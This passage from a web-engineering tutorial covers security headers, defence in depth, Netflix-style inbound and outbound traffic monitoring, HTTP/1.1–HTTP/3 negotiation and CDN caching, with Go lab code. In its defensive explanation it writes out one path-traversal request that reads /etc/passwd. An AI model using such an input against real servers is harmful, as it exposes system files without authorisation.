  • Block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x)
  • Use DNS resolution at validation time AND fetch time
  • Run fetcher in isolated network with no internal access
```

#### Path Traversal

```
Attack:
  GET /download?file=../../../etc/passwd
  Server: read("/var/www/files/../../../etc/passwd") → reads /etc/passwd ✗

Defense:
  • Canonicalize path and verify it starts with allowed base directory
  • Use chroot or container to isolate file access
  • Never take filenames directly from user input
```

---

### 11. Security Headers — Quick Reference

| Header | What It Does | Example |
|---|---|---|
| `Strict-Transport-Security` | Force HTTPS for N seconds | `max-age=31536000; includeSubDomains; preload` |
| `Content-Security-Policy` | Whitelist resource sources | `default-src 'self'; script-src 'self' 'nonce-xyz'` |
| `X-Frame-Options` | Prevent iframe embedding (clickjacking) | `DENY` |
| `X-Content-Type-Options` | Prevent MIME sniffing | `nosniff` |
| `Referrer-Policy` | Control Referer header | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Restrict browser APIs | `geolocation=(), camera=()` |
| `Cross-Origin-Opener-Policy` | Isolate browsing context | `same-origin` |
| `Cross-Origin-Embedder-Policy` | Required for SharedArrayBuffer | `require-corp` |
| `Cross-Origin-Resource-Policy` | Control cross-origin resource reads | `same-site` |

---

### 12. Defense in Depth — Netflix's Security Layers

```
Layer 1: DNS — CAA records, DNSSEC
Layer 2: TLS — TLS 1.3, HSTS preload, OCSP stapling, CT
Layer 3: Network — DDoS scrubbing, BGP RPKI, rate limiting at L3/L4
Layer 4: Edge WAF — OWASP rules, IP reputation, bot detection
Layer 5: Authentication — JWT with short TTL, OAuth2, MFA
Layer 6: Authorization — RBAC, least privilege, service-to-service mTLS
Layer 7: Application — Parameterized queries, output encoding, CSP, CORS
Layer 8: Monitoring — SIEM, anomaly detection, CT log monitoring
Layer 9: Secrets — Key rotation, hardware HSMs, no hardcoded credentials
Layer 10: Incident Response — Runbooks, on-call, cert revocation procedures
```

Each layer assumes the previous layer may fail. No single layer is the sole defense.

---

### Across the series

Part 9 of this guide turns several of these defences into Go code you can
run:

| Defence | Lab |
|---|---|
| HSTS, CSP, `nosniff`, Referrer-Policy, Permissions-Policy on every response | `httpsserver`, [Chapter 19](#chapter-19-a-production-https-server-in-go-tls-timeouts-headers-and-shutdown) |
| Server timeouts against Slowloris (200 held connections dropped in under 10 s) | `slowloris`, [Chapter 19](#chapter-19-a-production-https-server-in-go-tls-timeouts-headers-and-shutdown) |
| Request smuggling | `desync`, [Chapter 20](#chapter-20-reverse-proxies-in-go-the-client-s-identity-framing-and-request-smuggling) |
| Rate limiting by identity, not IP | `resilience`, [Chapter 21](#chapter-21-resilience-between-services-rate-limits-retries-idempotency-and-circuit-breakers) |
| SSRF protection that survives DNS tricks and redirects | `ssrfguard`, [Chapter 22](#chapter-22-outbound-requests-ssrf-and-safe-http-clients) |

Deeper material: the [Go guide's security part](../Golang/real-life-golang-guide.md#47-secure-coding-practices-in-go) (secure coding,
password hashing and JWTs, a WAF middleware, mTLS), the Go plan's
[WAF (Week 10)](../Golang/detailed-90-day-plan/week10.md), [API security (Week 11)](../Golang/detailed-90-day-plan/week11.md), and
[DDoS defence (Week 13)](../Golang/detailed-90-day-plan/week13.md), and the
[Linux guide's hardening chapter](../os-linux/real-life-os-guide.md#chapter-71-linux-security-hardening-selinux-apparmor-auditd-capabilities-and-least-privilege) for the host
underneath. The security guides go much further, and come before this guide in
the series: [Security from Zero](../security/real-life-guide.md) for foundations (OWASP Top 10, TLS,
PKI) and [Security Engineering in Depth, Part 6](../security/real-life-security-guide-v1.md#part-6-advanced-web-and-api-exploitation) for the advanced
web attacks, each with a Go lab.

### Key Takeaways

- **HSTS** closes the repeat-visit HTTP downgrade window. HSTS preload closes
  the first-visit window for preloaded domains, but it requires careful
  certificate and subdomain operations.
- **CSP** defends against XSS by whitelisting trusted script sources. Use nonces for inline scripts.
- **CORS** is browser-enforced — it does not prevent server-side attacks.
- **SameSite=Lax/Strict** cookies reduce many CSRF risks; high-risk actions
  still commonly use explicit CSRF tokens and origin checks.
- **HttpOnly** cookies prevent XSS from stealing session tokens.
- **Certificate Transparency** makes misissued certs publicly visible within minutes.
- **CAA records** restrict which CAs can issue certs for your domain.
- **JWT** is not encrypted — only signed. Never store sensitive data in it.
- **OCSP Stapling** provides cert freshness without privacy-leaking OCSP requests.
- Defense in depth: layer your defenses. Assume any single layer can be bypassed.

---

## Chapter 13 — Traffic Direction: SLI & SLO

> In this chapter, SLI and SLO mean **Site Local In** and **Site Local Out**:
> traffic direction relative to a site or datacenter. This is different from
> the SRE meanings, **Service Level Indicator** and **Service Level Objective**.
> The acronym collision is real; define the terms before using them in mixed
> networking/SRE conversations.

---

> **Looking for SLIs and SLOs in the SRE sense** (Service Level Indicators,
> Objectives, error budgets, and burn-rate alerts)? They're in
> [Chapter 23](#chapter-23-slis-slos-and-error-budgets-for-https-services), with a Go simulation of 30 days of
> traffic that shows which incidents should page and which should only open
> a ticket.

### The Simple Version (5-year-old)

Imagine a busy airport. Planes are either:
- **Landing** (arriving from outside) — that's **SLI: Site Local In**
- **Taking off** (leaving to the outside) — that's **SLO: Site Local Out**

The airport control tower (Netflix's network team) monitors both: how many planes are landing and taking off on each runway (network link), and can re-route flights if one runway is too busy.

---

### SLI — Site Local In

**SLI (Site Local In)** is **inbound traffic entering a site or datacenter** — packets arriving from the outside world (the internet) destined for servers inside.

#### In the Netflix Lifecycle

When you send your HTTP request:

```
Internet (you)
      │
      ▼   ◄── This is SLI: Site Local In
Netflix Datacenter / Edge boundary
  (border router ingress interface)
      │
      ▼
Internal servers (10.0.x.x)
```

Your GET request, TCP SYN packets, TLS ClientHello, HTTP headers — all of this is **SLI** traffic from Netflix's perspective.

#### What Netflix Monitors on SLI

```
Border Router Interface: xe-0/0/0 (facing Comcast peering)
Direction: IN (ingress)

Real-time counters:
  Bytes/second  in: ~120 Gbps  (HTTP requests, TCP ACKs, video player pings)
  Packets/sec   in: ~90 Mpps   (millions of packets per second)
  Flows/sec     in: ~500K      (new TCP connections per second)
  SYN rate      in: ~400K/s    (monitored for SYN flood DDoS)
  Avg pkt size  in: ~200 bytes (small — requests and ACKs are small)
```

#### SLI and Security

SLI is where **DDoS attacks arrive**. Netflix monitors SLI for:

```
Normal SLI:  100 Gbps inbound, mix of TCP ports 443 (HTTPS), 80 (HTTP redirect)
DDoS signal: 800 Gbps inbound, all UDP port 53 (amplification), from 50K source IPs

Action:
  → Black-hole routing: DROP all traffic matching attack signature at border router
  → Scrubbing center: route SLI traffic through DDoS scrubber, clean traffic forwarded in
  → BGP community: signal upstream ISPs to drop attack traffic before it enters Netflix's network
```

Firewall ACLs act on SLI:
```
ALLOW TCP dest-port 443  (HTTPS — your request)
ALLOW TCP dest-port 80   (HTTP — redirect to HTTPS)
ALLOW ICMP               (ping, traceroute — diagnostics)
DENY  TCP dest-port 22   (SSH — block external SSH to internal servers)
DENY  all other
```

---

### SLO — Site Local Out

**SLO (Site Local Out)** is **outbound traffic leaving a site or datacenter** — packets originating inside Netflix's network going out to the internet.

#### In the Netflix Lifecycle

When Netflix sends your HTTP response:

```
Internal servers (10.0.x.x)
      │
      ▼   ◄── This is SLO: Site Local Out
Netflix Datacenter / Edge boundary
  (border router egress interface)
      │
      ▼
Internet (back to you)
```

The HTML response, video chunks, TLS ServerHello, image bytes — all **SLO** traffic.

#### What Netflix Monitors on SLO

```
Border Router Interface: xe-0/0/0 (facing Comcast peering)
Direction: OUT (egress)

Real-time counters:
  Bytes/second out: ~380 Gbps  (HTML, video chunks, images, API responses)
  Packets/sec  out: ~280 Mpps
  BGP advertisements: which prefixes are being announced outbound
  Per-peer egress breakdown: how much traffic goes to each ISP peer
  Avg pkt size out: ~1400 bytes (close to MTU — video chunks fill packets)
```

#### The Asymmetry — Why SLO is Always Much Larger Than SLI

```
SLI (your request):
  GET / HTTP/2
  + headers: ~2KB total

SLO (Netflix response):
  HTML: 45KB (compressed)
  CSS: 150KB
  JavaScript: 500KB
  Images: 2MB
  Video (1 min of HD): ~150MB

Ratio: SLO is typically 3–50× larger than SLI for a media platform.

Netflix border router (Comcast peering link):
  SLI: 120 Gbps in
  SLO: 380 Gbps out
  Ratio: ~1:3 (requests vs responses)
```

---

### SLI + SLO in Traffic Engineering

Netflix has peering relationships with hundreds of ISPs. They can shift traffic between peers based on cost, performance, and capacity.

#### Peering Link View

```
Netflix has four peering links (simplified):

Interface     Peer        SLI (in)   SLO (out)   Cost/Gbps
xe-0/0/0      Comcast     120 Gbps   380 Gbps    $0 (free peer)
xe-0/0/1      AT&T        90 Gbps    270 Gbps    $0 (free peer)
xe-0/0/2      Tata        40 Gbps    120 Gbps    $0 (free peer - OCA)
xe-0/0/3      NTT Transit 50 Gbps    150 Gbps    $2/Gbps (paid transit)

Total SLI:  300 Gbps
Total SLO:  920 Gbps
```

#### Why Netflix Moves Traffic Between Peers

```
Scenario: Comcast xe-0/0/0 SLO reaches 95% capacity (380/400 Gbps).

Traffic engineering action:
  1. Reduce BGP LOCAL_PREF for Comcast-bound routes
     (makes other paths look more attractive to BGP)
  2. BGP re-routes some Comcast users to AT&T or Tata peers
  3. SLO on Comcast drops to 320 Gbps
  4. SLO on AT&T rises to 330 Gbps
  5. Both links are now safely within capacity

This is done without any user-visible disruption.
BGP convergence: ~5 seconds for internal routes.
```

#### 95th Percentile Billing (Burstable Billing)

Most transit providers charge based on the **95th percentile** of either SLO or (SLI + SLO), sampled every 5 minutes over a month:

```
5-minute SLO samples over a month:
  [5, 8, 12, 400, 380, 370, 350, 200, 50, 10, ...] Gbps

Sort all samples ascending.
95th percentile = top 5% excluded (the spikes).
You pay for the 95th percentile value.

Why this model:
  Allows burst to 100% capacity occasionally without paying for that peak.
  Pay for sustained capacity, not momentary bursts.
  Netflix engineers to keep 95th percentile under contracted rate to avoid overage charges.
```

---

### SLI vs SLO in Firewall Policy

Stateful firewalls track the direction of traffic initiation:

```
Stateful firewall rule:

ALLOW: TCP SLI from 0.0.0.0/0 to 10.0.4.0/24 port 443  (inbound HTTPS)
  → Creates a connection state table entry

ALLOW: TCP SLO from 10.0.4.0/24 to 0.0.0.0/0 ESTABLISHED
  → Return traffic for SLI-initiated connections automatically allowed

DENY: TCP SLI from 0.0.0.0/0 to 10.0.4.0/24 port 22
  → External SSH blocked

Result:
  Your GET request → SLI → ALLOWED (port 443)
  Netflix's response → SLO → ALLOWED (ESTABLISHED - return traffic)
  Attacker SSH attempt → SLI port 22 → DENIED
```

---

### SLI/SLO and Netflix Open Connect OCA

A key goal of OCA placement is converting expensive long-haul SLO into cheap/free local SLO:

```
WITHOUT OCA (all SLO from Netflix HQ):
  Netflix HQ → Internet → Tata Mumbai → User in Mumbai
  SLO travels: US → Mumbai (expensive transit)
  Tata pays Netflix for transit. Netflix pays NTT for transit. $$$$

WITH OCA at Tata Mumbai:
  OCA Mumbai → [Tata's internal network] → User in Mumbai
  SLO stays inside Tata's network instead of crossing paid transit links.
  No transit cost. Netflix gives OCA to Tata for free.
  Tata benefits: doesn't pay transit fees for Netflix video.
  Netflix benefits: zero SLO transit cost for ~95% of video.

Global SLO reduction:
  Netflix total SLO: ~600 Gbps
  Via OCA (no transit cost): ~570 Gbps (95%)
  Via origin (transit cost): ~30 Gbps (5%)
```

---

### Summary Table

| Concept | SLI (Site Local In) | SLO (Site Local Out) |
|---|---|---|
| Direction | Internet → Datacenter | Datacenter → Internet |
| What it is | Inbound traffic | Outbound traffic |
| Netflix example | Your HTTP request | Netflix's HTTP response + video |
| Typical volume | Smaller | Larger (3–50×) |
| DDoS concern | Yes — attacks arrive via SLI | DDoS amplification can exit via SLO |
| Firewall role | Ingress filtering — block attacks | Egress shaping — prevent saturation |
| Billing impact | Often not billed (or small) | Usually billed (95th percentile egress) |
| Traffic engineering | Adjust BGP LOCAL_PREF | Shift egress between peers |
| OCA impact | No change | Converts transit SLO to free local delivery |

---

### Key Takeaways

- **SLI (Site Local In)** = inbound traffic entering a datacenter. Your requests. TCP SYNs. TLS ClientHellos.
- **SLO (Site Local Out)** = outbound traffic leaving a datacenter. Netflix's responses. Video chunks. Images.
- SLO is usually much larger than SLI for media platforms because responses
  massively outweigh requests.
- **BGP traffic engineering** shifts SLO across peering links to balance cost and capacity.
- Firewall policies distinguish SLI-initiated (allowed by rule) from SLO-returned (allowed as ESTABLISHED).
- **95th percentile billing** means you pay for sustained egress, not momentary spikes.
- Netflix OCA's core purpose is to convert expensive transit SLO into free local delivery.
- Monitoring SLI for sudden spikes detects DDoS attacks. Monitoring SLO for capacity triggers traffic shifts.

---

# Part 8 — Expert operations: running HTTPS in production

The lifecycle is not only something to understand once. In production, you need
to operate it while browsers, CDNs, certificates, DNS records, proxies, mobile
networks, and backend services are changing underneath you. This part turns the
earlier chapters into an expert troubleshooting and operations playbook.

## Chapter 14 — HTTP version negotiation: HTTP/1.1, HTTP/2, HTTP/3, Alt-Svc, and fallbacks

### In one sentence
Modern HTTPS is negotiated, not assumed: the browser and server choose between
HTTP/1.1, HTTP/2, and HTTP/3 using TLS ALPN, QUIC, `Alt-Svc`, DNS records, and
fallback behavior.

### Why this matters
Two users can visit the same URL and use different protocol stacks. One may use
HTTP/3 over QUIC/UDP, another HTTP/2 over TLS/TCP, and another HTTP/1.1 because
a middlebox blocks UDP. Expert diagnosis starts by proving which path the
client actually used. Performance, failure modes, and even which load balancer
features apply all depend on it.

### How it actually works

```
HTTP/1.1 over TLS/TCP:
  DNS → TCP → TLS(ALPN=http/1.1) → HTTP request/response

HTTP/2 over TLS/TCP:
  DNS → TCP → TLS(ALPN=h2) → HTTP/2 frames and streams

HTTP/3 over QUIC/UDP:
  discover h3 support via Alt-Svc or HTTPS/SVCB DNS
  DNS → UDP/QUIC Initial + TLS 1.3 → ALPN=h3 → HTTP/3 streams
```

**ALPN decides between HTTP/1.1 and HTTP/2, inside the TLS handshake.** The
client lists what it speaks (`h2`, `http/1.1`) in the ClientHello, and the
server picks one in its reply. No extra round trip is needed. A server or
TLS-terminating proxy that doesn't support h2 simply picks `http/1.1`.

**HTTP/3 can't be negotiated that way**, because it runs over UDP. A client that
has only a TCP connection doesn't know QUIC is available. There are two ways
to find out:

1. **`Alt-Svc` response header** (RFC 7838):
   `Alt-Svc: h3=":443"; ma=86400` means "next time, you may use HTTP/3 on UDP
   port 443, and remember this for a day". The *first* visit uses TCP, and
   later visits can use QUIC.
2. **The DNS `HTTPS` record** (type 65, RFC 9460) publishes the same
   information in DNS (`alpn="h3,h2"`), so even the **first** connection can
   go straight to HTTP/3. It can also carry IP hints and Encrypted Client
   Hello keys.

**Fallback.** Browsers race QUIC against TCP (much like Happy Eyeballs for
IPv6), and if UDP/443 is blocked or QUIC fails, they quietly use HTTP/2 over
TCP and remember that QUIC is broken on this network for a while. That makes
HTTP/3 rollouts safe, and it also makes HTTP/3 problems invisible unless you
look for them.

**Connection coalescing (HTTP/2 and HTTP/3).** A browser may reuse one
connection for *different* hostnames if they resolve to the same IP and the
certificate covers both names. `www.example.com` and `static.example.com` can
share a connection, saving a handshake. It also means a request can reach a
server that never expected traffic for that hostname. A server answers
`421 Misdirected Request` to tell the browser to open a separate connection.

### Build it in Go (25 min) — see how a site advertises each version

This lab requests a site twice (once allowing only HTTP/1.1, once allowing
HTTP/2), reads `Alt-Svc`, and decodes the DNS `HTTPS` record by hand:

```go
// protoprobe: which HTTP versions does a site offer, and how is each one
// discovered? Compares HTTP/1.1 and HTTP/2 over TLS (ALPN), reads Alt-Svc,
// and decodes the DNS HTTPS record (type 65) that can advertise h3 up front.
//
//	go run ./protoprobe cloudflare.com
//	go run ./protoprobe www.google.com
package main

import (
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"math/rand/v2"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("usage: protoprobe HOST")
		os.Exit(2)
	}
	host := os.Args[1]
	url := "https://" + host + "/"

	// 1. Force HTTP/1.1: a non-nil, empty TLSNextProto map disables HTTP/2,
	//    so ALPN offers only "http/1.1".
	h1 := &http.Transport{TLSNextProto: map[string]func(string, *tls.Conn) http.RoundTripper{}}
	// 2. Allow HTTP/2: ALPN offers "h2" first.
	h2 := &http.Transport{ForceAttemptHTTP2: true}

	for _, t := range []struct {
		name string
		rt   http.RoundTripper
	}{{"HTTP/1.1 only", h1}, {"HTTP/2 allowed", h2}} {
		c := &http.Client{Transport: t.rt, Timeout: 10 * time.Second,
			CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
		start := time.Now()
		resp, err := c.Get(url)
		if err != nil {
			fmt.Printf("%-15s error: %v\n", t.name, err)
			continue
		}
		resp.Body.Close()
		fmt.Printf("%-15s -> %-8s %s in %v\n", t.name, resp.Proto, resp.Status, time.Since(start).Round(time.Millisecond))
		if t.name == "HTTP/2 allowed" {
			if alt := resp.Header.Get("Alt-Svc"); alt != "" {
				fmt.Printf("%-15s    Alt-Svc: %s   <- HTTP/3 offered for NEXT time\n", "", alt)
			} else {
				fmt.Printf("%-15s    no Alt-Svc header: no HTTP/3 advertised over HTTP\n", "")
			}
		}
	}

	// 3. The DNS HTTPS record lets a browser learn about h3 BEFORE connecting.
	alpn, err := httpsRecordALPN(host)
	switch {
	case err != nil:
		fmt.Println("HTTPS record:   lookup failed:", err)
	case alpn == nil:
		fmt.Println("HTTPS record:   none published")
	default:
		fmt.Printf("HTTPS record:   alpn=%v   <- usable on the FIRST connection\n", alpn)
	}
	fmt.Println("\n(Go's standard library has no HTTP/3 client; browsers, curl --http3, and")
	fmt.Println(" libraries such as quic-go do. This tool shows how h3 is DISCOVERED.)")
}

// httpsRecordALPN sends a raw DNS query for type 65 (HTTPS, RFC 9460) and
// returns the alpn SvcParam of the first record. See the TCP/IP guide's
// dnsquery lab for the wire format.
func httpsRecordALPN(host string) ([]string, error) {
	q := make([]byte, 12, 512)
	id := uint16(rand.N(1 << 16))
	binary.BigEndian.PutUint16(q[0:], id)
	binary.BigEndian.PutUint16(q[2:], 0x0100) // recursion desired
	binary.BigEndian.PutUint16(q[4:], 1)
	for _, l := range strings.Split(strings.TrimSuffix(host, "."), ".") {
		q = append(q, byte(len(l)))
		q = append(q, l...)
	}
	q = append(q, 0, 0, 65, 0, 1) // QTYPE=65 (HTTPS), QCLASS=IN

	c, err := net.Dial("udp", "1.1.1.1:53")
	if err != nil {
		return nil, err
	}
	defer c.Close()
	c.SetDeadline(time.Now().Add(3 * time.Second))
	c.Write(q)
	m := make([]byte, 1232)
	n, err := c.Read(m)
	if err != nil {
		return nil, err
	}
	m = m[:n]
	if n < 12 || binary.BigEndian.Uint16(m) != id {
		return nil, fmt.Errorf("bad reply")
	}
	an := int(binary.BigEndian.Uint16(m[6:]))
	off := skipName(m, 12) + 4 // skip the question
	for i := 0; i < an && off > 0 && off+10 <= n; i++ {
		off = skipName(m, off)
		typ := binary.BigEndian.Uint16(m[off:])
		rdlen := int(binary.BigEndian.Uint16(m[off+8:]))
		rd := off + 10
		off = rd + rdlen
		if typ != 65 || off > n {
			continue // e.g. a CNAME in front of the HTTPS record
		}
		// RDATA: SvcPriority(2) TargetName(name) then key(2) len(2) value...
		p := skipName(m, rd+2)
		for p+4 <= off {
			key, l := binary.BigEndian.Uint16(m[p:]), int(binary.BigEndian.Uint16(m[p+2:]))
			v := m[p+4 : min(p+4+l, off)]
			if key == 1 { // alpn: a list of length-prefixed protocol IDs
				var out []string
				for j := 0; j < len(v); j += 1 + int(v[j]) {
					out = append(out, string(v[j+1:min(j+1+int(v[j]), len(v))]))
				}
				return out, nil
			}
			p += 4 + l
		}
		return []string{}, nil // record exists, no alpn key
	}
	return nil, nil
}

// skipName returns the offset just after a (possibly compressed) DNS name.
func skipName(m []byte, off int) int {
	for off < len(m) {
		l := int(m[off])
		switch {
		case l == 0:
			return off + 1
		case l&0xC0 == 0xC0:
			return off + 2
		default:
			off += 1 + l
		}
	}
	return -1
}
```

Real results:

```text
$ go run ./protoprobe cloudflare.com
HTTP/1.1 only   -> HTTP/1.1 301 Moved Permanently in 129ms
HTTP/2 allowed  -> HTTP/2.0 301 Moved Permanently in 251ms
                   Alt-Svc: h3=":443"; ma=86400   <- HTTP/3 offered for NEXT time
HTTPS record:   alpn=[h3 h2]   <- usable on the FIRST connection

$ go run ./protoprobe github.com
HTTP/1.1 only   -> HTTP/1.1 200 OK in 263ms
HTTP/2 allowed  -> HTTP/2.0 200 OK in 114ms
                   no Alt-Svc header: no HTTP/3 advertised over HTTP
HTTPS record:   none published
```

**What to notice:**

- **A non-nil, empty `TLSNextProto` map** is Go's documented way to switch off
  HTTP/2 in a client. With it, ALPN offers only `http/1.1`.
- **Not every major site uses HTTP/3.** At the time of testing, GitHub
  advertised it neither in `Alt-Svc` nor in DNS. "Every user gets HTTP/3"
  is never a safe assumption.
- **Go's standard library has no HTTP/3 implementation.** Go servers usually
  sit behind a CDN or proxy that terminates QUIC, or use the `quic-go`
  library. That's why Go services so often speak HTTP/2 or HTTP/1.1 to their
  own load balancer even when users see HTTP/3.

**Exercises:**

1. Run it against five sites you use daily. Which publish an HTTPS record?
   Which advertise `h3` only in `Alt-Svc`?
2. With `curl --http3` (if your curl supports it), compare
   `curl -w '%{http_version} %{time_appconnect}\n'` over HTTP/3 and HTTP/2 to
   the same site.
3. Block UDP/443 on your machine (macOS: `pfctl`; Linux:
   `sudo iptables -A OUTPUT -p udp --dport 443 -j DROP`), load a site in
   Chrome, and check the Protocol column in DevTools → Network. It falls back
   to `h2` with no visible error. Remove the rule afterwards.

### Real-world scenario
Mobile users report intermittent slowness after an HTTP/3 rollout, but office
users look fine. The office firewall blocks UDP/443, so office clients quietly
fall back to HTTP/2. Mobile clients use QUIC and hit a packet-loss or MTU issue:
QUIC packets are UDP datagrams that must fit the path MTU, typically 1,200–1,350
bytes. If you only test from the office, you debug the wrong protocol.

### Common mistakes
- Saying "the site uses HTTP/2" or "the site uses HTTP/3" without checking the
  actual client, network, and request.
- Forgetting that HTTP/3 can fall back when UDP is blocked.
- Assuming a server-side protocol rollout affects all users at once.
- Forgetting connection coalescing when two hostnames share a certificate and an
  IP but are served by different backends.
- Load-balancing HTTP/2 or gRPC per *connection* (L4) and wondering why traffic
  is uneven ([TCP/IP guide, Chapter 57](../networking/tcp-ip/real-life-guide-v1.md#chapter-57-production-load-balancing-l4-vs-l7-health-checks-draining-retries)).

### Check yourself
1. Where in the handshake are HTTP/1.1 and HTTP/2 chosen, and why does that
   cost no extra round trip?
2. Give two ways a browser learns that a site supports HTTP/3, and say which one
   helps on the first visit.
3. What does `421 Misdirected Request` tell a browser?
4. Why might a Go service speak HTTP/2 to its load balancer while users get HTTP/3?

### Key Takeaways
- ALPN negotiates h1/h2 inside TLS. HTTP/3 is discovered via `Alt-Svc` or the DNS `HTTPS` record.
- Clients fall back silently, so always find out which protocol a failing user actually used.
- HTTP/2 and HTTP/3 multiplex many requests on one connection: great for latency, but it changes load balancing and failure modes.

## Chapter 15 — Cache correctness: browser, CDN, proxy, and application caches

### In one sentence
Caching is correct only when the cache key, freshness rules, personalization
boundaries, invalidation path, and failure behavior are all intentional.

### Why this matters
Caching makes the web fast, but it also causes some of the most painful
production bugs: one user's data served to another user, stale JavaScript after
a deploy, broken pages caused by mixed asset versions, and origin outages hidden
until the cache expires. Each cache layer (browser, service worker, CDN,
reverse proxy, application) has its own rules. A response travels through all
of them.

### How it actually works
For every response, answer five questions:

```
1. Who may cache this?       browser only, shared CDN, proxy, nobody?
2. What is the cache key?    URL, method, Host, Accept-Encoding, headers?
3. How long is it fresh?     max-age, s-maxage, immutable, revalidation?
4. How is it invalidated?    new URL, purge API, surrogate key, TTL only?
5. What happens on failure?  serve stale, revalidate, bypass, fail closed?
```

**The directives that answer them:**

| Directive | Meaning |
|---|---|
| `no-store` | Nobody stores this, anywhere |
| `private` | Only the user's browser may store it; shared caches (CDN, proxy) must not |
| `public` | Shared caches may store it, even if it would normally be uncacheable (e.g. with `Authorization`) |
| `max-age=N` | Fresh for N seconds |
| `s-maxage=N` | Overrides `max-age` for **shared** caches only, so the CDN keeps it longer than browsers |
| `no-cache` | May be stored, but must be **revalidated** before every use (the name is misleading) |
| `immutable` | Never changes while fresh; don't revalidate even on reload (for hashed asset URLs) |
| `stale-while-revalidate=N` | After expiry, serve stale for up to N s while fetching a fresh copy in the background |
| `stale-if-error=N` | If the origin fails, keep serving stale for up to N s |

**Revalidation** turns "fetch again" into "is my copy still good?". The cache
sends `If-None-Match: "<etag>"` (or `If-Modified-Since`). If nothing changed,
the origin answers **`304 Not Modified`** with no body.

**`Vary`** adds request headers to the cache key. `Vary: Accept-Encoding`
keeps gzip and brotli variants apart. `Vary: Accept-Language` keeps languages
apart. `Vary: Cookie` effectively makes a response uncacheable in shared
caches, which is sometimes exactly what you want.

Safer patterns:

```http
# Personalized HTML or API response
Cache-Control: no-store

# Public hashed asset
Cache-Control: public, max-age=31536000, immutable

# CDN cache, browser revalidates quickly
Cache-Control: public, max-age=60, s-maxage=3600, stale-while-revalidate=30

# If content varies by encoding or language
Vary: Accept-Encoding, Accept-Language
```

### Build it in Go (60 min) — a CDN edge you can watch make decisions

`edgecache` is a caching reverse proxy that implements the rules above:
`no-store`, `private`, `max-age`, `s-maxage`, `stale-while-revalidate`, `Vary`,
"never share a response that sets a cookie", and ETag revalidation. Its
`-demo` mode starts an origin with four endpoints and replays a scripted set
of requests:

```go
// edgecache: a tiny CDN edge -- a caching reverse proxy that follows HTTP's
// caching rules: Cache-Control (no-store, private, max-age, s-maxage,
// stale-while-revalidate), Vary, Set-Cookie, ETag revalidation, and Age.
//
//	go run ./edgecache -demo              # starts an origin + the cache, runs a scripted test
//	go run ./edgecache -origin http://localhost:8080 -listen :8081
package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"sync"
	"time"
)

type entry struct {
	status  int
	header  http.Header
	body    []byte
	stored  time.Time
	ttl     time.Duration // freshness lifetime
	swr     time.Duration // stale-while-revalidate window
	refresh sync.Once     // at most one background refresh per stale entry
}

type cache struct {
	origin string
	client *http.Client
	mu     sync.Mutex
	items  map[string]*entry
	vary   map[string][]string // base key -> request headers the origin said it varies on
}

func newCache(origin string) *cache {
	return &cache{origin: origin, client: &http.Client{Timeout: 10 * time.Second},
		items: map[string]*entry{}, vary: map[string][]string{}}
}

// key = method + URL + the values of every header named in Vary. Getting the
// key wrong is how caches serve one user's response to another.
func (c *cache) key(r *http.Request) string {
	base := r.Method + " " + r.URL.RequestURI()
	c.mu.Lock()
	vary := c.vary[base]
	c.mu.Unlock()
	var b strings.Builder
	b.WriteString(base)
	for _, h := range vary {
		b.WriteString("|" + h + "=" + r.Header.Get(h))
	}
	return b.String()
}

func (c *cache) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	cacheable := (r.Method == http.MethodGet || r.Method == http.MethodHead) && r.Header.Get("Authorization") == ""
	if !cacheable {
		c.forward(w, r, "BYPASS")
		return
	}
	k := c.key(r)
	c.mu.Lock()
	e := c.items[k]
	c.mu.Unlock()

	if e != nil {
		age := time.Since(e.stored)
		switch {
		case age < e.ttl:
			c.serve(w, e, "HIT")
			return
		case age < e.ttl+e.swr:
			c.serve(w, e, "STALE")                                          // fast answer now...
			e.refresh.Do(func() { go c.fetch(r.Clone(r.Context()), k, e) }) // ...fresh copy later
			return
		}
	}
	fresh, state := c.fetch(r, k, e)
	if fresh == nil {
		http.Error(w, "origin unreachable", http.StatusBadGateway)
		return
	}
	c.serve(w, fresh, state)
}

// fetch asks the origin, revalidating with If-None-Match when we hold an old
// copy. A 304 means "your copy is still good": no body crosses the network.
func (c *cache) fetch(r *http.Request, k string, old *entry) (*entry, string) {
	req, _ := http.NewRequest(r.Method, c.origin+r.URL.RequestURI(), nil)
	req.Header = r.Header.Clone()
	if old != nil && old.header.Get("ETag") != "" {
		req.Header.Set("If-None-Match", old.header.Get("ETag"))
	}
	resp, err := c.client.Do(req)
	if err != nil {
		return nil, ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode == http.StatusNotModified && old != nil {
		e := &entry{status: old.status, header: old.header, body: old.body, stored: time.Now(), ttl: old.ttl, swr: old.swr}
		c.store(r, k, e, resp.Header)
		return e, "REVALIDATED"
	}
	e := &entry{status: resp.StatusCode, header: resp.Header.Clone(), body: body, stored: time.Now()}
	ttl, swr, ok := policy(resp)
	if !ok {
		return e, "UNCACHEABLE" // pass it through to this client, store nothing
	}
	e.ttl, e.swr = ttl, swr
	c.store(r, k, e, resp.Header)
	return e, "MISS"
}

func (c *cache) store(r *http.Request, k string, e *entry, h http.Header) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if v := h.Get("Vary"); v != "" {
		base := r.Method + " " + r.URL.RequestURI()
		var hs []string
		for _, f := range strings.Split(v, ",") {
			hs = append(hs, http.CanonicalHeaderKey(strings.TrimSpace(f)))
		}
		c.vary[base] = hs
		k = c.keyLocked(r, hs)
	}
	c.items[k] = e
}

func (c *cache) keyLocked(r *http.Request, vary []string) string {
	k := r.Method + " " + r.URL.RequestURI()
	for _, h := range vary {
		k += "|" + h + "=" + r.Header.Get(h)
	}
	return k
}

// policy decides whether a SHARED cache may store a response, and for how long.
func policy(resp *http.Response) (ttl, swr time.Duration, ok bool) {
	if resp.StatusCode != http.StatusOK || resp.Header.Get("Set-Cookie") != "" {
		return 0, 0, false // never share a response that sets someone's cookie
	}
	cc := map[string]string{}
	for _, d := range strings.Split(resp.Header.Get("Cache-Control"), ",") {
		k, v, _ := strings.Cut(strings.TrimSpace(strings.ToLower(d)), "=")
		cc[k] = v
	}
	if _, ok := cc["no-store"]; ok {
		return 0, 0, false
	}
